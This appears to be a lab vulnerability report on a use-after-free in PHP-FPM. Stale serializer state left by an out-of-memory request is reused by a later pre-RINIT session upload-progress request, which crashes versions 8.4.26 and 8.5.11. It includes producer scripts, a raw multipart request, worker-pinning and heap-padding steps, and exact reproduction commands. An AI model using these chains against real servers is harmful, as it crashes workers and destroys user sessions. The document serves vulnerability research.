# FPM pre-RINIT serializer-state reuse — final report

**Run root:** `/tmp/opencode/research/fpm_bg_20261023T021053Z/`
**Date:** 2026-10-23 (all log timestamps are UTC; local file mtimes are UTC+2)
**Status:** **PROVEN** on PHP-FPM 8.4.26 and 8.5.11 (stock `pm=dynamic`, stock nginx, stock
`session.serialize_handler=php`). **FIXED** in 8.5.12 by `php_basic_early_rinit()`.
**Scope:** lab-only artifacts; no push, commit, PR, advisory or external service was touched.

---

## 1. Question and verdict

The question was whether a request can bail out after
`php_var_unserialize_init()` / `php_var_serialize_init()` but before the matching
`*_destroy()`, leaving `BG(unserialize)` / `BG(serialize)` stale in a surviving FPM worker,
and whether the **pre-RINIT** session handling of a later multipart upload-progress request
(`php_session_rfc1867_update()` → `php_session_initialize()` / `php_session_flush(1)`)
reuses that stale state before `RINIT` clears it.

**Verdict: yes.** The primitive is real and reachable with stock PHP-FPM and stock nginx:

- **Decode side (original objective):** a producer request OOMs inside
  `php_var_unserialize()`, leaving `BG(unserialize).level=1`, `serialize_lock=0`, and
  `BG(unserialize).data` pointing into the freed request heap. A later multipart
  upload-progress request on the same worker decodes its session **before RINIT** and
  reuses the stale `php_unserialize_data`.
  - PHP 8.4.26 official stock `pm=dynamic`: **SIGSEGV**, nginx 502 (workers `2776102`,
    `2808575`).
  - PHP 8.5.11 stock `pm=dynamic`: **SIGSEGV** (worker `2810772`); single-worker layout
    also crashes (`2791133`, `2807550`, `2807575`, `2807588`).
  - PHP 8.5.12: **fixed** (`php_basic_early_rinit()` clears both globals before
    `sapi_activate()`); 10/10 consumers clean.
- **Encode side (residual lead from the MediaWiki run):** a producer OOMs inside
  `serialize()`, leaving `BG(serialize).level=1`, `lock=0`. A later multipart request whose
  session contains a PHP **reference** triggers `php_session_flush(1)` in the pre-RINIT
  upload-progress handler; `php_var_serialize_init()` reuses the stale
  `php_serialize_data`, and `php_add_var_hash()` dereferences the freed HashTable.
  - 8.4.26 official stock `pm=dynamic`: **SIGSEGV** (worker `2881398`).
  - 8.5.11 stock `pm=dynamic`: **SIGSEGV** (worker `2889204`).
  - 8.5.11 single-worker: 3/3 **session corruption** (stale `n=122875` carried across
    requests, encoded `R:` index out of range, subsequent decode fails, session file
    destroyed), no SIGSEGV in that layout.
  - 8.5.12: **fixed**; hard OOM (`> 256 MB` hard limit) exits the worker with `_exit(137)`
    before any state survives; a soft OOM is cleaned up (`slevel=0`), and consumers return
    200 `SESSION=unset`.

The stale state is not a response-body leak under `display_errors=Off`; the observable
effects are a worker SIGSEGV (stock dynamic) and, in one layout, session destruction.

---

## 2. Environment and method

### 2.1 Binaries (sha256)

| Role | Path | sha256 | Build |
|---|---|---|---|
| 8.4.26 **official stock** (stripped PIE) | `/tmp/opencode/research/fpm8426_20261022T031921Z/libs/php-fpm` | `d8947ff91518b130d16213010f3d30df7a4d6238daaa8ff171a3b5c7f5ecae55` | `php:8.4.26-fpm` image, built 2026-10-21; Build ID `a8f0ad794e5b49e128a12f314a2fe1caff8b7e56` |
| 8.4.26 **symbol build** (committed source) | `.../fpm_bg_20261023T021053Z/build/sym8426/sapi/fpm/php-fpm` | `e0b30a0aa8577e72e09d4f769ff684ef80cf1155ce2a25bea7c2927bcfd21023` | release, `--disable-debug`, built 2026-10-23 from `/tmp/opencode/php-8.4.26` |
| 8.5.11 plain full-extension | `/tmp/opencode/research/plain_full_8x_20261023T011800Z/bin/8.5.11/php-fpm` | `fe6db8c4a95536a3c7eb4aeda3e10d681937cb251420ab7cb33731b7d610f0f2` | built 2026-10-23 |
| 8.5.12 plain full-extension (fixed control) | `/tmp/opencode/research/plain_full_8x_20261023T011800Z/bin/8.5.12/php-fpm` | `735e3527b41187c6a1ee5729d641aaa0bb7b75b8647645f804f6f221e8668f50` | built 2026-10-23 |
| 8.5.12 ASAN (not decisive) | `/tmp/opencode/research/asan_wp_8.5.12_20261022T172738Z/build/asan-bin/php-fpm` | `452e4f4d9dc8f590d7c48ac1a8142ab896d18e56bba01fcf5367128977bb27c8` | `DEBUG`, built 2026-10-22; only a ping was issued (see §11) |

The 8.4.26 symbol build is only used for gdb diagnostics on the single-worker vhost; the
stock claims use the official stripped binary. The 8.5.11/8.5.12 binaries are the existing
plain full-extension builds from `/tmp/opencode/research/plain_full_8x_20261023T011800Z`.

### 2.2 Front end and FPM pools

- nginx **1.30.1** (`/opt/nginx-1.30.1/sbin/nginx`), one worker, stock vhosts.
- FastCGI routing (nginx → FPM):

| nginx | FPM | Binary | Pool |
|---|---|---|---|
| `127.0.0.1:29310` | `127.0.0.1:29311` | 8.4.26 symbol build | `pm=static`, `max_children=1` (gdb) |
| `127.0.0.1:29320` | `127.0.0.1:29321` | 8.4.26 official | **`pm=dynamic`, `max_children=5`** (stock claim) |
| `127.0.0.1:29330` | `127.0.0.1:29331` | 8.5.12 plain | **`pm=dynamic`, `max_children=5`** |
| `127.0.0.1:29340` | `127.0.0.1:29342` | 8.5.12 plain | `pm=static`, `max_children=1` (gdb) |
| `127.0.0.1:29350` | `127.0.0.1:29341` | 8.5.12 ASAN | `pm=static`, `max_children=1` (ping only) |
| `127.0.0.1:29352` | `127.0.0.1:29351` | 8.5.11 plain | `pm=static`, `max_children=1` (gdb) |
| `127.0.0.1:29354` | `127.0.0.1:29353` | 8.5.11 plain | **`pm=dynamic`, `max_children=5`** (stock claim) |

Stock pinning method (`scripts/ser_chain.py`, `scripts/stock_chain.py`): start four
`slow.php?s=15` requests to occupy four of the five dynamic workers, then send the producer
(the fifth child) followed by the consumer. The FPM access log records the worker PID for
every request, so the producer and consumer worker can be verified exactly.

### 2.3 PHP configuration (all pools)

`display_errors=Off`, `display_startup_errors=Off`, `log_errors=On`,
`error_reporting=E_ALL`, `html_errors=Off`, `memory_limit=128M`, `post_max_size=8M`,
`upload_max_filesize=2M`, `max_execution_time=30`, `max_input_time=60`,
`enable_post_data_reading=On`, `session.save_handler=files`,
`session.serialize_handler=php`, `session.use_strict_mode=0`,
`session.use_cookies=1`, `session.use_only_cookies=1`, `session.use_trans_sid=0`,
`session.upload_progress.enabled=1`, `session.upload_progress.cleanup=1`,
`session.upload_progress.freq="0"`, `session.upload_progress.min_freq="0"`.
No opcache/JIT directives are loaded. ASLR is on; no `setarch -R`.

`post_max_size=8M` does not bound the producers: both are **GET** requests with a small
query string; the large allocation is built by PHP code (`producer_oom.php` creates a
32,000,012-byte serialized string; `producer_ser_oom.php` creates a ~10.5 MB array).

### 2.4 Instrumentation

- gdb on the single-worker static vhosts (`29310`, `29352`, `29340`) and on the
  `build/sym8426` binary for 8.4.26 source-line backtraces.
- gdb scripts: `scripts/timelineser.gdb` (serialize/unserialize init + shutdown state),
  `scripts/catchser.gdb` (SIGSEGV catch + backtrace), `scripts/sern.gdb`
  (`data->n`/HashTable fields), `scripts/timeline8512*.gdb` (early-rinit checkpoints).
- FPM logs: `lab/logs/fpm-*-error.log` (worker SIGSEGV / exits) and
  `lab/logs/fpm-*-access.log` (worker PID per request, `access.format=%p %R %m %s %f`).

### 2.5 `basic_globals` layout used by gdb

```
+0x350  uint32  serialize_lock
+0x358  void*   serialize.data
+0x360  uint32  serialize.level
+0x368  void*   unserialize.data
+0x370  uint32  unserialize.level
```

`struct php_serialize_data { HashTable ht; uint32_t n; }` (HashTable 56 bytes, `n` at
`+0x38`); the decode-side `struct php_unserialize_data` starts with `last`, `first_dtor`,
`last_dtor` (`tmp_var()` reads `(*var_hashx)->last_dtor`, which is where the freed block's
`-1` comes from).

---

## 3. Mechanism (code path)

### 3.1 The reuse condition

`ext/standard/var.c:1346` (8.4.26; identical logic in 8.5.11):

```c
PHPAPI php_serialize_data_t php_var_serialize_init(void) {
    if (BG(serialize_lock) || !BG(serialize).level) {
        d = emalloc(sizeof(struct php_serialize_data));
        zend_hash_init(&d->ht, 16, NULL, ZVAL_PTR_DTOR, 0);
        d->n = 0;
        if (!BG(serialize_lock)) {
            BG(serialize).data = d;
            BG(serialize).level = 1;
        }
    } else {
        d = BG(serialize).data;      /* reuse a previous request's table */
        ++BG(serialize).level;
    }
    return d;
}
```

`php_var_unserialize_init()` (`ext/standard/var_unserializer.c:64`) uses the same
`!BG(serialize_lock) && BG(unserialize).level` test. The matching `*_destroy()` runs only
if the function returns normally; a `zend_bailout()` (OOM / `E_USER_ERROR` /
`max_execution_time`) skips it, leaving `level=1`, `lock=0`, and `data` pointing into the
request heap. At request shutdown the request heap is freed, so `data` dangles.

### 3.2 Why the next request hits it *before RINIT*

`php_request_startup()` (`main/main.c:1873` in 8.4.26) calls `php_hash_environment()`,
which builds `$_POST`; for `multipart/form-data` this runs
`sapi_handle_post()` → `rfc1867_post_handler()` →
`php_session_rfc1867_callback()` → `php_session_rfc1867_update()` (`session.c:3175`).
That function does:

```c
php_session_initialize();            /* decode: php_var_unserialize_init */
PS(session_status) = php_session_active;
...
php_session_flush(1);                /* encode: php_var_serialize_init */
```

all **before** `PHP_RINIT(basic)` runs. On 8.4.26 and 8.5.11, `PHP_RINIT(basic)` is the
only place that does `BG(serialize_lock)=0; memset(&BG(serialize),0,...);
memset(&BG(unserialize),0,...)` (`basic_functions.c:390`), so the pre-RINIT decode/encode
sees the previous request's stale state.

The session id is taken from the **multipart body**: the parser stores the value of the
field named `PHPSESSID` into `progress->sid` (`session.c:3259-3265`); the field order must
put `PHPSESSID` before `PHP_SESSION_UPLOAD_PROGRESS` (stock behavior; no cookie is needed).

### 3.3 Why the producer can bail out after init

`producer_oom.php`:

```php
$n = 8000000;
$s = 'a:'.$n.':{' . str_repeat('i:1;', $n) . '}';   // 32,000,012 bytes, ~34 MB live
$r = unserialize($s);
```

`zif_unserialize()` calls `php_var_unserialize_init()`; the 8M-element array then tries a
320 MB `zend_hash_real_init_mixed()` allocation and hits `memory_limit=128M`:

```
PHP Fatal error: Allowed memory size of 134217728 bytes exhausted
(tried to allocate 335544320 bytes) in .../producer_oom.php on line 7
```

The bailout is `zend_mm_safe_error()` → `_zend_bailout()`; the destroy is skipped. The
gdb trace on 8.5.11 confirms the exact site:

```
ZEND_BAILOUT lock=0 ... udata=0x7ff98187d000 ulevel=1
#5 zend_mm_safe_error
#4 zend_mm_alloc_huge
#3 zend_hash_real_init_mixed
#2 php_var_unserialize_internal
#1 php_var_unserialize
#0 ...
```

`producer_ser_oom.php` is the encode-side analogue:

```php
$arr = array_fill(0, 300000, str_repeat('A', 512));
$s = serialize($arr);      // OOM while growing the smart_str buffer
```

```
PHP Fatal error: Allowed memory size of 134217728 bytes exhausted
(tried to allocate 65015808 bytes) in .../producer_ser_oom.php on line 8
```

and leaves `BG(serialize).level=1`, `lock=0` (gdb `REQSHUTDOWN sdata=0x7f054f002040
slevel=1`).

---

## 4. Decode-side chain — `BG(unserialize)`

### 4.1 Producer state

`producer_oom.php?n=8000000` returns HTTP 500 with a **0-byte body**
(`display_errors=Off`; the fatal is only in the PHP error log). The worker survives the
producer request:

- 8.4.26 official stock: `2808575 127.0.0.1 GET 500 /producer_oom.php`
- 8.5.11 stock: `2810772 ... GET 500 /producer_oom.php`

### 4.2 Consumer

`consumer.php` is a normal script, but the crash happens before it runs. The request is a
multipart POST (raw file `evidence/stock2/consumer_after_oom.raw`, 537 bytes):

```
POST /consumer.php HTTP/1.1
Host: 127.0.0.1:29320
Content-Type: multipart/form-data; boundary=----bgBoundary7MA4YWxkTrZu0gW
Content-Length: 368
Connection: close

------bgBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="PHPSESSID"

stocksid2
------bgBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

bgupload
------bgBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="f"; filename="a.txt"
Content-Type: text/plain

A
------bgBoundary7MA4YWxkTrZu0gW--
```

Session file before the consumer (14 bytes):

```
p|s:5:"hello";
```

(sha256 `5c8c3db7c9d31d70ad92ab05928ed3a0025646724f0a7c67e54b10eeaf7aa43c`).

### 4.3 Results

| Version / build | Pool | Producer | Consumer | Worker | Result |
|---|---|---|---|---|---|
| 8.4.26 official stock | dynamic 5 | 500 | 502 | `2776102` (02:16:36) | SIGSEGV |
| 8.4.26 official stock | dynamic 5 | 500 | 502 | `2808575` (02:34:13) | SIGSEGV |
| 8.4.26 symbol (gdb) | static 1 | 500 | 502 | `2751987` (02:15:32), `2774900` (02:15:55) | SIGSEGV, `INIT_STALE level=1 lock=0 data=0x7f054f06e000` |
| 8.5.11 plain static | static 1 | 500 | c4/c8/c10 502; others 200 | `2791133`, `2807550`, `2807575`; gdb `2807588` | SIGSEGV |
| 8.5.11 plain stock | dynamic 5 | 500 | 502 (chain 2) | `2810772` (02:35:59) | SIGSEGV |
| 8.5.11 plain stock | dynamic 5 | 500 | 200 `SESSION=["p"]` (chain 1) | `2810779` (02:35:44) | survived (heap-layout-dependent) |
| 8.5.12 plain static (fixed) | static 1 | 500 / wakeup | 10/10 200 `SESSION=unset`; wakeup 200 | `2778794` | no crash; early rinit clears |

FPM log lines (verbatim, UTC):

```
[23-Oct-2026 04:16:36] WARNING: [pool www] child 2776102 exited on signal 11 (SIGSEGV) ...
[23-Oct-2026 04:34:13] WARNING: [pool www] child 2808575 exited on signal 11 (SIGSEGV) ...
[23-Oct-2026 04:33:11] WARNING: [pool www] child 2791133 exited on signal 11 (SIGSEGV) ...
[23-Oct-2026 04:33:12] WARNING: [pool www] child 2807550 exited on signal 11 (SIGSEGV) ...
[23-Oct-2026 04:33:12] WARNING: [pool www] child 2807575 exited on signal 11 (SIGSEGV) ...
[23-Oct-2026 04:35:59] WARNING: [pool www] child 2810772 exited on signal 11 (SIGSEGV) ...
```

### 4.4 gdb evidence

**8.4.26 symbol build** (`evidence/gdb/crash_8426.log`):

```
TL INIT_STALE level=1 lock=0 data=0x7f054f06e000
#0 php_var_unserialize_init () at ext/standard/var_unserializer.c:64
#1 ps_srlzr_decode_php (val=0x7f054f058248 "p|s:5:\"hello\";", vallen=14)
#2 php_session_decode
#3 php_session_initialize
#4 php_session_rfc1867_update (progress=0x7f054f066000, force_update=0)
#5 php_session_rfc1867_callback
#6 rfc1867_post_handler
#7 sapi_handle_post
#8 php_default_treat_data
#9 php_auto_globals_create_post
#10 zend_activate_auto_globals
#11 php_hash_environment
#12 php_request_startup (main.c:1873)
...
Program received signal SIGSEGV
#0 tmp_var (var_hashx=..., num=1) at var_unserializer.c:168
#1 var_tmp_var
#2 ps_srlzr_decode_php
...
rax = 0xffffffffffffffff   (last_dtor = -1, Zend MM free-list metadata)
si_addr = 0xffffffffffffffff
```

The crash is inside `var_tmp_var`, dereferencing the freed `php_unserialize_data`
(`last_dtor=-1`), before `php_hash_environment` returns.

**8.5.11 single worker** (`evidence/gdb/crash_8511.log`, worker `2807588`):

```
U_INIT lock=0 udata=(nil) ulevel=0
SHUTDOWN lock=0 udata=0x7ff98187d000 ulevel=1
U_INIT lock=0 udata=0x7ff98187d000 ulevel=1
      W0=0x5050505050505050 W1=0x5050505050505050
      W2=0x5050505050505050 W3=0x5050505050505050
Program received signal SIGSEGV
#0 var_tmp_var+23   rax=0x5050505050505050
#1 ps_srlzr_decode_php
#2 php_session_decode
#3 php_session_initialize
#4 php_session_rfc1867_update
#5 php_session_rfc1867_callback
#6 rfc1867_post_handler
#7 sapi_handle_post
#8 php_default_treat_data
#9 php_auto_globals_create_post
#10 zend_activate_auto_globals
#11 php_hash_environment
#12 php_request_startup
```

The 0x50 words are the multipart `pad` field (`'P' = 0x50`) that overwrote the freed
`php_unserialize_data` block. The 8.5.11 static loop (`evidence/chain8511_loop/`) sent ten
consumers with different pad sizes (raw sizes 537…129,188 bytes): c4, c8 and c10 crashed
(`2791133`, `2807550`, `2807575`); c1/c2/c3/c5/c6/c7/c9 returned 200
`SESSION=["p"]`. The crash is heap-layout dependent, not request-content dependent.

### 4.5 8.5.12 fixed control

`php_basic_early_rinit()` (`ext/standard/basic_functions.c:492`) is called from
`main/main.c:1939`, immediately before `sapi_activate()`:

```c
BG(serialize_lock) = 0;
memset(&BG(serialize), 0, sizeof(BG(serialize)));
memset(&BG(unserialize), 0, sizeof(BG(unserialize)));
php_url_scanner_early_rinit();
```

gdb on the 8.5.12 static worker (`evidence/gdb/timeline8512_wakeup_chain.log`) with the
`producer.php` `__wakeup` producer (which leaves `lock=1`, `ulevel=1`):

```
REQSTART   lock=1 sdata=(nil) slevel=0 udata=0x7f21af87e000 ulevel=1
EARLY_ENTRY lock=1 sdata=(nil) slevel=0 udata=0x7f21af87e000 ulevel=1
POST_EARLY lock=0 sdata=(nil) slevel=0 udata=(nil) ulevel=0
U_INIT_ENTRY lock=0 sdata=(nil) slevel=0 udata=(nil) ulevel=0
```

The same is visible for the OOM producer (`evidence/gdb/timeline8512_oom_chain.log`):
`BAILOUT ... ulevel=1` then `REQSHUTDOWN ... ulevel=0` (8.5.12's delayed-OOM path cleans
up), and every consumer enters with `ulevel=0`. Ten consecutive
producer→consumer cycles on the static worker returned 200 `SESSION=unset`
(`evidence/fixed_8512pad/c1..c10.resp`), worker `2778794` alive.

---

## 5. Encode-side chain — `BG(serialize)` (residual lead)

This is the follow-up to the MediaWiki run's residual note: the encode-side staleness is
real, and a consumer that serializes a **reference/object** (rather than scalar
upload-progress data) dereferences the freed table.

### 5.1 Producer

`producer_ser_oom.php?n=300000`:

```php
$arr = array_fill(0, 300000, str_repeat('A', 512));   // ~10.5 MB live
$s = serialize($arr);                                  // OOM in smart_str growth
```

HTTP 500, 0-byte body; fatal only in the log:

```
PHP Fatal error: Allowed memory size of 134217728 bytes exhausted
(tried to allocate 65015808 bytes) in .../producer_ser_oom.php on line 8
```

gdb at the producer's shutdown:

```
REQSHUTDOWN sdata=0x7f054f002040 slevel=1   (8.4.26)
SHUTDOWN    sdata=0x7ff98187b040 slevel=1 n=122875   (8.5.11)
```

i.e. the next request's `php_var_serialize_init()` will take the `else` branch and reuse
the freed `php_serialize_data`; `data->n` has already counted 122,875 serialized values.

### 5.2 Consumer

Same consumer script and same upload-progress multipart request, but the session file
contains a PHP **reference** (32 bytes):

```
p|a:2:{i:0;s:5:"hello";i:1;R:2;}
```

sha256 `355bfe5960d7abc24847218615a539b16657b253d83dcee0f42f7beffffcfee3`.

The pre-RINIT decode (`php_session_initialize`) succeeds, creating a `zend_reference` for
`$_SESSION['p'][1]` → `$_SESSION['p'][0]`. Then `php_session_flush(1)` encodes the session;
`php_var_serialize_intern` calls `php_add_var_hash()` for the reference
(`var.c:1080`), which does:

```c
data->n += 1;                              /* write into freed struct */
...
key = (zend_ulong) Z_COUNTED_P(var);
zv = zend_hash_index_find(&data->ht, key); /* UAF read */
...
zend_hash_index_add_new(&data->ht, key, &zv_n); /* UAF write */
```

No pad is needed on 8.4.26 for the crash.

### 5.3 Results

| Version / build | Pool | Producer | Consumer | Worker | Result |
|---|---|---|---|---|---|
| 8.4.26 symbol (gdb) | static 1 | 500 | 502 | `2775308`, `2880499` | SIGSEGV in `php_add_var_hash` |
| 8.4.26 official stock | dynamic 5 | 500 | 502 | `2881398` (02:43:30) | SIGSEGV |
| 8.5.11 plain stock | dynamic 5 | 500 | 502 | `2889204` (02:46:30) | SIGSEGV |
| 8.5.11 plain static | static 1 | 500 | 200 `SESSION=[]` | `2807906` | 3/3 session corruption, no SIGSEGV |
| 8.5.12 plain static | static 1 | hard 502 (137) / soft 500 | 200 `SESSION=unset` | `2881791` | fixed |
| 8.5.12 plain stock | dynamic 5 | hard 502 (137) | 200 `SESSION=unset` | `2890984` (fresh) | fixed |

**8.4.26 full backtrace** (`evidence/ser_gdb/chain2_bt.log`):

```
SER_INIT sdata=0x7f054f002040 slevel=1
Program received signal SIGSEGV
#0 zend_mm_free_heap (heap=..., ptr=0x7f04399d0c50) at Zend/zend_alloc.c:1528
#1 _efree
#2 zend_hash_packed_to_hash (ht=0x7f054f002040) at Zend/zend_hash.c:370
#3 _zend_hash_index_add_or_update_i
#4 zend_hash_index_add_new
#5 php_add_var_hash (data=0x7f054f002040, var=0x7f054f068540, in_rcn_array=false)
      at ext/standard/var.c:791
#6 php_var_serialize_intern (var_hash=0x7f054f002040, is_root=false) at var.c:1080
#7 php_var_serialize_nested_data
#8 php_var_serialize_intern (is_root=true)
#9 php_var_serialize
#10 ps_srlzr_encode_php (session.c:1084)
#11 php_session_encode
#12 php_session_save_current_state (write=1)
#13 php_session_flush (write=1)
```

The stale `ht` address `0x7f054f002040` is exactly the producer's
`BG(serialize).data` at shutdown. The crash is the UAF read/write of the freed HashTable
(`zend_hash_packed_to_hash` frees a garbage `arData` pointer).

**8.5.11 static corruption** (`evidence/ser_8511s/reps/rep1..3`, `evidence/ser_gdb/n8511.log`):
three repetitions, each:

1. producer 500 (OOM at line 8);
2. consumer 200 with `SESSION=[]`;
3. PHP log: `PHP Warning: PHP Request Startup: Failed to decode session object. Session
   has been destroyed in Unknown on line 0`;
4. `sess_bgser1` deleted (the session file is destroyed after the failed re-decode).

gdb shows why: the consumer's first `SER_INIT` reuses `sdata=0x7ff98187b040` with
`slevel=1 n=122875`; the encode continues from the producer's counter, so the reference is
written with an out-of-range `R:` index (≈122,876), and the cleanup's second
`php_session_initialize()` cannot decode its own write:

```
SHUTDOWN    sdata=0x7ff98187b040 slevel=1 n=122875
SER_INIT    sdata=0x7ff98187b040 slevel=1 n=122875
SER_INIT    sdata=0x7ff98187b040 slevel=1 n=122891
SER_INIT    sdata=0x7ff98187b040 slevel=1 n=122905
SHUTDOWN    sdata=(nil) slevel=0
```

This is silent session corruption (the request still returns 200); the crash is
heap-layout dependent (8.4.26 crashed in the same layout; 8.5.11 dynamic crashed; 8.5.11
static corrupted).

### 5.4 8.5.12 encode-side control

- **Hard OOM:** the same `producer_ser_oom.php` requests a 132,124,672-byte allocation
  while ~130 MB is live. 8.5.12's hard limit is 200% of `memory_limit` = **268,435,456
  bytes**; the allocation would exceed it, so `zend_mm_hard_limit_error()` calls
  `_exit(137)`:
  ```
  Hard memory limit of 268435456 bytes exhausted (tried to allocate 132124672 bytes)
  in .../producer_ser_oom.php on line 8
  child ... exited with code 137
  ```
  The worker is replaced; the consumer lands on the fresh child and returns
  200 `SESSION=unset` (static: `2881791`; dynamic: `2890984`).
- **Soft OOM:** `producer_ser_soft.php?mb=120&n=30000` (120 MB ballast + 30k elements)
  returns 500 with `Allowed memory size ... (tried to allocate 2101248 bytes)`, worker
  survives, and gdb at shutdown shows `sdata=(nil) slevel=0` — the delayed-OOM path did
  not leave stale serialize state. The consumer returns 200 `SESSION=unset`
  (`evidence/ser_8512s/consumer_soft.resp`).

---

## 6. Observability and the `display_errors=Off` question

- Every producer 500 body is **0 bytes** (`evidence/stock/producer_oom.body`,
  `evidence/ser_stock/producer.body`, `evidence/ser_8511d/producer.body`,
  `evidence/ser_8512s/producer_soft.body`, …). PHP fatal text appears only in
  `lab/logs/php_*_error.log`.
- The 502 bodies are nginx's 157-byte HTML error page; no PHP error text.
- The consumer body `CONSUMER PID=... STATUS=1 SID= SESSION=["p"]` is **identical to the
  clean baseline** (`evidence/baseline/consumer_clean.resp`, run before any producer;
  `evidence/ser_baseline/clean.resp`, clean reference-session baseline). It is therefore
  **not** a dirty-state leak. Only the crash (or the 8.5.11 static session corruption)
  distinguishes a poisoned worker.
- No memory-disclosure primitive was demonstrated. The decode-side UAF dies on
  `var_tmp_var`/`last_dtor`; the encode-side UAF dies (or corrupts the session blob). The
  session-file corruption is a write-side effect, not a read of freed memory into the
  response.
- The 8.5.11 static corruption is only visible in the PHP log (warning) and in the session
  directory (file deleted); the HTTP response remains 200 with an empty `SESSION`.

---

## 7. Stock application producers — negative results

The primitive needs a request that calls `unserialize()`/`serialize()` with an allocation
large enough to OOM after init. Stock apps were checked for such a path:

- **WordPress 7.1.3:** no stock unauthenticated producer was identified. The earlier
  WordPress run reached the engine-level producer only through a **labeled synthetic
  mu-plugin** replicating the HPOS branch of a commercial plugin (vendor code absent);
  with that synthetic sink the OOM-in-`unserialize` path reproduced on PHP 8.5.10 (stale
  `level=1, lock=0`, 8,216-byte `php_unserialize_data`, 1/4 consumers SIGSEGV). That is
  not a stock-application claim and was not repeated in this run.
- **MediaWiki 1.46.2:** the dedicated MediaWiki run is a **clean negative** for the decode
  side (`/tmp/opencode/research/mw_109619_20261023T010708Z/report_final.md`); its
  `unserialize()` sites are session reads / persistence, not attacker-controlled request
  input.
  - 8.5.11 / 8.5.12 at `post_max_size=8M`: absolute-max login 8,387,211 B → HTTP 200,
    peak 102,396 kB / 104,444 kB, no OOM (128M limit).
  - 8.3.35: OOM exists only at `Session.php:545` (`openssl_decrypt`) and
    `SqlBagOStuff.php:1486` (session-persistence `serialize()`), never at
    `Session.php:557` (`unserialize`); 1-byte boundary 8,168,672 → 200/128M peak,
    8,168,673 → 500 at decrypt. The worker survives.
  - The 8.3.35 encode-side bailout does leave `BG(serialize)` stale, but the MW consumer's
    upload-progress session data is scalars/arrays with no references, so
    `php_add_var_hash()` is never called; C0/C1 are byte-identical (36,370 B).
  - Stored-blob route blocked (no large session row persisted; all `MWSession` rows
    ≤511 B); stock nginx 1 MiB blocks the 8.17 MB producer.
  - This is exactly why §5 changed the consumer: a reference in the session is the missing
    ingredient. With it, the same class of request crashes 8.4.26/8.5.11 and is fixed in
    8.5.12.

MediaWiki was **not** used as a producer in this run; the negative result above is cited
from its own run to avoid duplicating it.

---

## 8. Preconditions for the chain

1. **Pre-RINIT session handling:** stock `session.upload_progress.enabled=1` and a
   multipart field `PHPSESSID` before `PHP_SESSION_UPLOAD_PROGRESS` (so `progress->sid`
   is set before the progress handler runs). No cookie is required.
2. **Producer bailout after serializer init:** an OOM (or equivalent `zend_bailout`)
   inside `unserialize()` / `serialize()`. On 8.4.26/8.5.11 this is trivially reachable
   with a 32 MB serialized array (decode) or a ~10 MB array being serialized (encode);
   `post_max_size=8M` is irrelevant because the producers are GET requests.
3. **Same worker:** `pm=dynamic` with the victim pinned by four slow requests, or
   `pm=static` with one worker. A 502-respawned worker is fresh and loses the state.
4. **Decode side:** any valid session file (e.g. `p|s:5:"hello";`); the stale
   `php_unserialize_data` is dereferenced by `var_tmp_var` during decode.
5. **Encode side:** the session value must contain a PHP **reference** or object, e.g.
   `p|a:2:{i:0;s:5:"hello";i:1;R:2;}`. The upload-progress array itself (scalars/arrays)
   does not call `php_add_var_hash()` on a ref/object, which is why the MediaWiki consumer
   did not dereference the stale table.
6. **Heap layout:** the freed block must be reused/overwritten (or the stale table fields
   are benign). The `'P'=0x50` pad field made the 8.5.11 decode crash deterministic;
   without grooming the same chain can survive (8.5.11 dynamic chain 1) or corrupt the
   session (8.5.11 static encode side). The 8.4.26 encode crash was reproducible without
   a pad in the tested layout.
7. **Not 8.5.12:** `php_basic_early_rinit()` clears `serialize_lock`, `BG(serialize)` and
   `BG(unserialize)` before `sapi_activate()`; additionally the 200% hard limit kills the
   worker on huge non-fallible allocations instead of leaving state.

---

## 9. Reproduction

The lab is already running (masters in `lab/run/*.pid`); the commands below are the exact
drivers used.

### 9.1 Decode side (stock 8.4.26)

```bash
cd /tmp/opencode/research/fpm_bg_20261023T021053Z
# pin four of the five dynamic workers, run the OOM producer, then the consumer
python3 scripts/stock_chain.py /tmp/opencode/research/fpm_bg_20261023T021053Z
# expected: producer 500 (0-byte body), consumer 502, fpm-stock-error.log SIGSEGV
```

`scripts/stock_chain.py` starts four `slow.php?s=15` requests, waits 2 s, sends
`producer_oom.php?n=8000000`, sleeps 0.05 s, sends
`consumer_req.py --port 29320 --sid stocksid1`, then prints the producer code, the
consumer's first status line and the sleeper codes. The per-request worker PIDs are in
`lab/logs/fpm-stock-access.log` (`access.format=%p ...`); the crashing PID is in
`lab/logs/fpm-stock-error.log`.

The manual two-request form:

```bash
printf 'p|s:5:"hello";' > lab/sessions_stock/sess_stocksid2
curl -sS -o /dev/null -w '%{http_code}\n' 'http://127.0.0.1:29320/producer_oom.php?n=8000000'
python3 scripts/consumer_req.py --port 29320 --sid stocksid2 --outdir evidence/manual
```

### 9.2 Encode side

```bash
printf 'p|a:2:{i:0;s:5:"hello";i:1;R:2;}' > lab/sessions_stock/sess_bgser1
python3 scripts/ser_chain.py 29320 bgser1 evidence/repro_ser \
        /tmp/opencode/research/fpm_bg_20261023T021053Z fpm-stock.pid
# ser_chain.py sends producer_ser_oom.php?n=300000 then consumer_req.py --sid bgser1
# expected: producer 500, consumer 502, fpm-stock-error.log SIGSEGV
```

Manual form:

```bash
curl -sS -o /dev/null -w '%{http_code}\n' 'http://127.0.0.1:29320/producer_ser_oom.php?n=300000'
python3 scripts/consumer_req.py --port 29320 --sid bgser1 --outdir evidence/manual_ser
```

### 9.3 gdb diagnostics

```bash
# 8.4.26 symbol build, single worker (29311)
gdb -q -p "$(ps --ppid "$(cat lab/run/fpm-diag.pid)" -o pid= | tr -d ' ')" \
    -x scripts/timelineser.gdb
# consumer crash backtrace: scripts/catchser.gdb
# 8.5.11 single worker (29351): scripts/catchcrash8511.gdb / scripts/timeline8511.gdb
# 8.5.12 early-rinit checkpoints: scripts/timeline8512b.gdb
```

Worker PIDs are not stable across crashes; read the current child with
`ps --ppid "$(cat lab/run/<pool>.pid)" -o pid=` before attaching. Every gdb script prints
`detach`/`quit` on the second shutdown or on SIGSEGV.

### 9.4 Deterministic single-worker variants

The same chains run on the nginx vhosts `29310` (8.4.26 symbol), `29352` (8.5.11 plain)
and `29340` (8.5.12 plain), each `pm=static` 1 child, with no sleeper pinning.

---

## 10. Artifact index

Run root: `/tmp/opencode/research/fpm_bg_20261023T021053Z/`

- **Configs:** `lab/conf/php-*.ini`, `lab/conf/fpm-*.conf`, `lab/conf/nginx.conf`,
  `lab/conf/fastcgi_params`.
